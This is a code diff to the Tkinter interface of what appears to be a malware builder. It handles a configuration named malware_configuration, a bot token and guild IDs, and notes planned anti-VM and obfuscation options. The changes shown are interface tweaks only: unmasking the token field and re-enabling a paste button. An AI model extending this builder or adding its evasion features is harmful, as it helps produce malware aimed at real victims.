@@ -180,22 +180,22 @@ class Builder:
         self.load_configuration(True)
 
         self.canvas.create_text(230, 140, text='BOT Token:', fill='white', font=('Consolas', 16), anchor=tk.E)
-        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
+        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
         self.token_entry.insert(0, self.malware_configuration['token'])
         self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['token_entry']))
         self.token_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 140, window=self.token_entry, anchor='w')
-        #self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
-        #self.paste_token_button = tk.Button(
-        #    self.canvas,
-        #    image=self.paste_token_icon,
-        #    disabledforeground='white',
-        #    relief='flat',
-        #    width=15,
-        #    height=15,
-        #    command=self.paste_token
-        #    )
-        #self.canvas.create_window(640, 140, window=self.paste_token_button, anchor='w')
+        self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
+        self.paste_token_button = tk.Button(
+            self.canvas,
+            image=self.paste_token_icon,
+            disabledforeground='white',
+            relief='flat',
+            width=15,
+            height=15,
+            command=self.paste_token
+            )
+        self.canvas.create_window(640, 140, window=self.paste_token_button, anchor='w')
  
         self.canvas.create_text(230, 170, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
@@ -583,8 +583,9 @@ class Builder:
         self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')
 
         # Icon
-        # Anti-VM
+        # Anti-VM   /w advanced options
         # Obfuscation
+        
 
 
 
